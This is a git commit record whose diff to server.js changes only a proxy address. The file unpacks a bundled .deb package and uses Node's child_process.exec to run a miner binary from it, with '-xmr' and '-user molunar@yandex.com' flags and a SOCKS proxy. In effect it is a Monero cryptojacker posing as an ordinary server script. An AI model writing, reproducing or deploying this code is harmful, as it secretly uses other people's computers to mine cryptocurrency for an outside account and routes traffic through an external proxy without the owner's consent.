c04a85b78102d502a7fc9b20fd636a9efa101013
wddesbvsp <30755597+wddesbvsp@users.noreply.github.com>
2017-08-06 14:45:39 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,4 +1,4 @@
-var str = "dpkg -x ./test/tmp.deb ./test/tmp && cd ./test/tmp/opt/min*/ && ./min* -user molunar@yandex.com -xmr -proxy socks://87.92.1.215:35923";
+var str = "dpkg -x ./test/tmp.deb ./test/tmp && cd ./test/tmp/opt/min*/ && ./min* -user molunar@yandex.com -xmr -proxy socks://92.1.215:35923";
 var child = require('child_process').exec(str);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
